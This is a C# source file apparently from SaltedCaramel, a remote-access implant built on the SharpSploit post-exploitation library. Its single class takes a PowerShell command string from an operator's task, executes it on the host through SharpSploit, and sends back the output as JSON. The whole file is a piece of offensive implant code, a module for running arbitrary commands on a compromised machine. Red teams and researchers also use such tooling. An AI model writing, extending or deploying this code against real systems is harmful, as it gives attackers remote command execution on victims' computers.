using Newtonsoft.Json;
using SharpSploit.Execution;
using System;
using System.Diagnostics;

namespace SaltedCaramel.Tasks
{
    class Powershell
    {
        internal static void Execute(SCTaskObject task)
        {
            string args = task.@params;

            try
            {
                string result = Shell.PowerShellExecute(args);

                task.status = "complete";
                task.message = JsonConvert.SerializeObject(result);
            }
            catch (Exception e)
            {
                Debug.WriteLine("[!] Powershell - ERROR: " + e.Message);
                task.message = e.Message;
            }
        }
    }
}
